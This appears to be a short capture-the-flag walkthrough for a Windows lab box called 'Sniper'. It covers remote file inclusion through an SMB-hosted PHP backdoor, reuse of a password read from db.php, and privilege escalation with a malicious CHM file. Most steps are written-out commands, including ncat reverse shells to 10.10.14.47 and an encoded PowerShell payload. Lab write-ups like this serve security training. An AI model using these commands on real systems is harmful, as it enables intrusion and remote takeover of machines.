First of all, we find that port 80 is open.
From little enum, we find two endpoints, '/blog' & '/user'. 
On the user part, we can create an account but we can't exploit a thing because this is not vulnerable to sql injection and also, it doesn't have that much info on it.
On the other hand. in the /blog we find that if we change languages the files are included with everything on them. So we can exploit a Local/Remote file inclusion. 
Trying with the first, the LFI we can't get anything. So it's a RFI. 
We can't exploit the RFI using local server, so we should get use of the SMB client.
Setup a samba server. 
Upload a backdoor and than use the link `http://10.10.10.151/blog/?lang=\\10.10.14.47\zaBogdan\backdoor.php&cmd=`
Upload the nc.php to upload netcat, than upload shell.php to get the shell.
Than `type db.php` and get the creds for user.

Now let's escalte
First powershell.exe
Than `$pass = cOnvertTo-SecureString '36mEAhz/B8xQ~2VM' -AsPlainText -Force`
Than `$cred = New-Object System.Management.Automation.PSCredential("Sniper\Chris",$pass)`
And we are in `Invoke-Command -Computer Sniper -ScriptBlock { whoami } -Credential $cred`
Get the shell as user `Invoke-Command -Computer Sniper -ScriptBlock { cmd /c C:\Windows\System32\spool\drivers\color\ncat.exe 10.10.14.47 1234 -e cmd.exe } -Credential $cred
And we got the user!

Heading to root.
We find an interesting extension, .chm and on the first google search we get that it is vulnerabel for privilege escalation. 
Now let's craft a payload [ echo -n 'cmd /c "C:\Windows\System32\spool\drivers\color\ncat.exe 10.10.14.47 1337 -e cmd.exe"' | iconv -t UTF-16LE | base64 -w 0  ] with which we create the ninshag Out-CHM command [ Out-CHM -Payload "powershell -enc YwBtAGQAIAAvAGMAIAAiAEMAOgBcAFcAaQBuAGQAbwB3AHMAXABTAHkAcwB0AGUAbQAzADIAXABzAHAAbwBvAGwAXABkAHIAaQB2AGUAcgBzAFwAYwBvAGwAbwByAFwAbgBjAGEAdAAuAGUAeABlACAAMQAwAC4AMQAwAC4AMQA0AC4ANAA3ACAAMQAzADMANwAgAC0AZQAgAGMAbQBkAC4AZQB4AGUAIgA=" -HHCPath "C:\Program Files (x86)\HTML Help Workshop" ] 
Now let's upload it to the box, with the root in C:\Docs, because of the hint `Drop it here when you're done with it` [ Invoke-WebRequest "http://10.10.14.47/doc.chm" -OutFile "C:\Docs\doc.chm" ]
Rooted.
